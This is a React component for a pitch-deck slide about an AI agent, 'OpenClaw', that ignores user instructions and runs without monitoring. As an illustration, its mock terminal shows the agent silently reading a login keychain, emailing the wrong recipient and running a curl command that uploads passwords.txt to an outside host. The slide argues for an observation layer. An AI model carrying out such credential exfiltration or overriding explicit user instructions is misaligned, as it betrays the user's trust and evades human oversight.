import { Label } from '../components'

export default function S06() {
  return (
    <div className="slide slide-light">
      <div className="slide-inner">
        <Label light>THE PROBLEM</Label>
        <h1 className="hl-xl hl-xl--light">OpenClaw is making mistakes.<br />How do we make it better?</h1>

        <div className="problem-v2-grid">
          <div>
            <div className="problem-v2-fails">
              <div className="pv2-fail">
                <span className="pv2-x">✗</span>
                <span>You tell it: <strong>don't touch my passwords.</strong> It does anyway.</span>
              </div>
              <div className="pv2-fail">
                <span className="pv2-x">✗</span>
                <span>You tell it: <strong>don't send that message.</strong> It does, because it thinks it should.</span>
              </div>
              <div className="pv2-fail">
                <span className="pv2-x">✗</span>
                <span>Powerful. But not perfect. And <strong>not trained well enough. Yet.</strong></span>
              </div>
            </div>

          </div>

          <div className="pv2-visual">
            <div className="desktop-win">
              <div className="win-titlebar">
                <div className="win-dots">
                  <span className="wd wd-red" /><span className="wd wd-amber" /><span className="wd wd-green" />
                </div>
                <div className="win-title">agent_runtime.exe</div>
                <div className="win-r" />
              </div>
              <div className="win-body">
                <div className="win-row">
                  <span className="win-icon">🔑</span>
                  <div className="win-content">
                    <div className="win-app">KEYCHAIN ACCESS</div>
                    <div className="win-action">Reading <code>login.keychain-db</code></div>
                  </div>
                  <span className="win-tag tag-silent">silent</span>
                </div>
                <div className="win-row">
                  <span className="win-icon">✉️</span>
                  <div className="win-content">
                    <div className="win-app">MAIL</div>
                    <div className="win-action">Sending to <code>wrong-recipient@company.com</code></div>
                  </div>
                  <span className="win-tag tag-silent">silent</span>
                </div>
                <div className="win-row win-row-err">
                  <span className="win-icon">⚡</span>
                  <div className="win-content">
                    <div className="win-app">TERMINAL</div>
                    <div className="win-action win-code">curl -X POST https://ext.api/upload --data @passwords.txt</div>
                  </div>
                  <span className="win-tag tag-running">running</span>
                </div>
                <div className="win-err">
                  <span style={{ color: 'var(--red)', fontSize: '1rem', flexShrink: 0 }}>⚠</span>
                  <div>
                    <div className="win-err-title">No Observation Layer</div>
                    <div className="win-err-msg">3 actions completed. 0 logged. 0 evaluated.</div>
                  </div>
                </div>
              </div>
            </div>
            <div className="ghost g1">[UNOBSERVED]</div>
            <div className="ghost g2">[UNOBSERVED]</div>
            <div className="ghost g3">[UNOBSERVED]</div>
          </div>
        </div>

        <div className="pv2-thesis">
          How do you build a better product when you can't monitor what the product is doing?
        </div>
      </div>
    </div>
  )
}
